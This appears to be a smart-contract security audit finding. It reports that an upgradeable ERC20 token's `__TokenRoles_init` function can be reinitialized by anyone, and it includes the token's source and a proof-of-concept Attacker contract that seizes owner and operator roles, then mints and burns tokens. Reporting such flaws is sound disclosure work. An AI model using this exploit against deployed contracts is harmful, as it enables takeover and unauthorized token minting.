# Vulnerability details

## Description: 
The `TokenRoles::__TokenRoles_init` function doesn't have any access control or initializer modifier. Anyone can reinitialize this function and manipulate the critical states of the function. The function `__TokenRoles_init` introduces several potential risks due to the lack of the initializer modifier or proper access control. Since this function is part of an upgradeable contract system, these risks are amplified, especially in the context of upgradeable contracts where state initialization is critical.

## Impact: 
Since `_TokenRoles_init` is marked as public and lacks the `initializer` modifier or any access control, it can be called multiple times.

- Reinitializing the contract can lead to full control being transferred to a malicious actor. In an upgradeable system, this is highly dangerous.
- Unrestricted Role Assignment: Allowing anyone to assign themselves critical roles like owner and operator severely compromises the security and control of the contract.
- Lack of Role Revocation and Multiple Initializations: In an upgradeable contract, if the `_TokenRoles_init` function is called multiple times (even by accident), it can reset or overwrite critical contract state (e.g., ownership and roles), leading to privilege escalation and system compromise.
- Potential for Griefing Attacks, Denial of Service (DoS): Because anyone can call this function and assign arbitrary roles, malicious actors could deliberately assign invalid or untrusted addresses as the owner or operator, disrupting the proper functioning of the system.

## Proof of Concept
1. The legitimate owner deploys and initializes the ChakraToken contract, setting their address as the owner and operator.
2. A malicious actor later calls the \_\_TokenRoles_init function directly and reinitializes the contract, making themselves the new owner and operator.
3. The attacker can now fully control the contract, mint tokens, burn tokens, and upgrade the contract, effectively taking over the system.

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Import statements for required interfaces and contracts
import {IERC20Mint} from "contracts/interfaces/IERC20Mint.sol";
import {IERC20Burn} from "contracts/interfaces/IERC20Burn.sol";
import {ERC20Upgradeable} from "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import {TokenRoles} from "contracts/TokenRoles.sol";

/**
 * @title ChakraToken
 * @dev An upgradeable ERC20 token with minting and burning capabilities
 */
contract ChakraToken is ERC20Upgradeable, TokenRoles, IERC20Mint, IERC20Burn {
    // Custom decimals for the token
    uint8 set_decimals;

    /**
     * @dev Initializes the contract
     * @param _owner The address of the contract owner
     * @param _operator The address of the operator
     * @param _name The name of the token
     * @param _symbol The symbol of the token
     * @param _decimals The number of decimals for the token
     */
    function initialize(
        address _owner,
        address _operator,
        string memory _name,
        string memory _symbol,
        uint8 _decimals
    ) public initializer {
        __TokenRoles_init(_owner, _operator);
        __ERC20_init(_name, _symbol);
        set_decimals = _decimals;
    }

    /**
     * @dev Function to authorize an upgrade
     * @param newImplementation Address of the new implementation
     */
    function _authorizeUpgrade(
        address newImplementation
    ) internal override onlyOwner {}

    /**
     * @dev Mints tokens to the caller's address
     * @param value The amount of tokens to mint
     */
    function mint(uint256 value) external onlyRole(OPERATOR_ROLE) {
        _mint(_msgSender(), value);
    }

    /**
     * @dev Mints tokens to a specified account
     * @param account The address to mint tokens to
     * @param value The amount of tokens to mint
     */
    function mint_to(
        address account,
        uint256 value
    ) external onlyRole(OPERATOR_ROLE) {
        _mint(account, value);
    }

    /**
     * @dev Burns tokens from the caller's address
     * @param value The amount of tokens to burn
     */
    function burn(uint256 value) external onlyRole(OPERATOR_ROLE) {
        _burn(_msgSender(), value);
    }

    /**
     * @dev Burns tokens from a specified account
     * @param account The address to burn tokens from
     * @param value The amount of tokens to burn
     */
    function burn_from(
        address account,
        uint256 value
    ) external onlyRole(OPERATOR_ROLE) {
        _burn(account, value);
    }

    /**
     * @dev Returns the number of decimals for the token
     * @return uint8 The number of decimals
     */
    function decimals() public view override returns (uint8) {
        return set_decimals;
    }

    /**
     * @dev Returns the version of the contract
     * @return string The version number
     */
    function version() public pure returns (string memory) {
        return "0.0.1";
    }
}
```

Attacker Contract : The attacker deploys this contract, passes the address of the vulnerable ChakraToken contract, and then calls the exploit function to reinitialize the contract and take over as the owner.

<summary>POC</summary>

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ChakraToken.sol";  // Assuming ChakraToken contract is already deployed

contract Attacker {
    ChakraToken public targetContract;

    constructor(address _target) {
        // Initialize with the vulnerable ChakraToken contract's address
        targetContract = ChakraToken(_target);
    }

    // Exploit function to reinitialize the vulnerable contract and gain ownership and operator role
    function exploit() public {
        // Call the vulnerable __TokenRoles_init function with attacker's address as owner and operator
        targetContract.__TokenRoles_init(msg.sender, msg.sender);
    }

    // Mint tokens after gaining the operator role
    function mintTokens(uint256 amount) public {
        targetContract.mint(amount);
    }

    // Burn tokens from attacker's address after gaining the operator role
    function burnTokens(uint256 amount) public {
        targetContract.burn(amount);
    }
}
```
